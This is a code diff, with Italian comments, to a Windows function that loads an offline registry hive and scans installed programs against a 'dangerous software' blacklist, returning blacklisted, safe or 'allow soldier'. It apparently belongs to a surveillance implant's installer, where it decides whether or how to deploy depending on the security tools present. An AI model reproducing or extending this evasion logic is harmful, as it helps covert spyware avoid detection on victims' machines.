@@ -59,8 +59,11 @@ BOOL WIN_IsSupported(os_struct_t *os_info)
 	return FALSE;
 }
 
-// Torna TRUE se c'e' un software pericoloso
-BOOL WIN_IsBlackListedSoftware(os_struct_t *os_struct)
+// Se c'e' un software pericoloso torna uno dei seguenti valori
+// #define BL_BLACKLISTED 0
+// #define BL_SAFE 1
+// #define BL_ALLOWSOLDIER 2
+DWORD WIN_IsBlackListedSoftware(os_struct_t *os_struct)
 {
 	HKEY hKeyUninstall = NULL, hKeyProgram = NULL;
 	DWORD dwordval, index, len;
@@ -69,8 +72,8 @@ BOOL WIN_IsBlackListedSoftware(os_struct_t *os_struct)
 	WCHAR software_hive_path[MAX_PATH];
 	WCHAR system_root[MAX_PATH];
 	HANDLE hfile;
-	DWORD i;
-	BOOL ret_val = FALSE;
+	DWORD i, t_ret;
+	DWORD ret_val = BL_SAFE;
 
 	ZeroMemory(os_struct->bl_software, sizeof(os_struct->bl_software));
 
@@ -84,14 +87,14 @@ BOOL WIN_IsBlackListedSoftware(os_struct_t *os_struct)
 		swprintf_s(software_hive_path, MAX_PATH, L"%s%s%s", os_struct->drive, system_root, L"\\config\\software");
 		hfile = CreateFile(software_hive_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
 		if (hfile == INVALID_HANDLE_VALUE)
-			return TRUE;
+			return BL_BLACKLISTED;
 	}
 	CloseHandle(hfile);
 	if (RegLoadKey(HKEY_LOCAL_MACHINE, L"RCS_SOFTWARE\\", software_hive_path) != ERROR_SUCCESS) 
-		return TRUE;
+		return BL_BLACKLISTED;
 	
 	// Al primo giro guarda quelli a 32 poi quelli a 64bit 
-	for (i=0; i<2; i++) {
+	for (i=0; i<2 && ret_val != BL_BLACKLISTED; i++) {
 		do {
 			index = 0;
 			if (i == 0) {
@@ -130,9 +133,13 @@ BOOL WIN_IsBlackListedSoftware(os_struct_t *os_struct)
 					wcsncat_s(product, sizeof(product) / sizeof(product[0]), L")", _TRUNCATE);
 				}
 
-				if (IsDangerousString(product)) {
-					ret_val = TRUE;				
+				t_ret = IsDangerousString(product, os_struct); 
+				if (t_ret == BL_ALLOWSOLDIER) 
+					ret_val = BL_ALLOWSOLDIER;				
+				else if (t_ret == BL_BLACKLISTED) {
+					ret_val = BL_BLACKLISTED;
 					_snwprintf_s(os_struct->bl_software, sizeof(os_struct->bl_software)/sizeof(os_struct->bl_software[0]), _TRUNCATE, L"%s", product);
+					break;
 				}
 			}
 		} while(0);
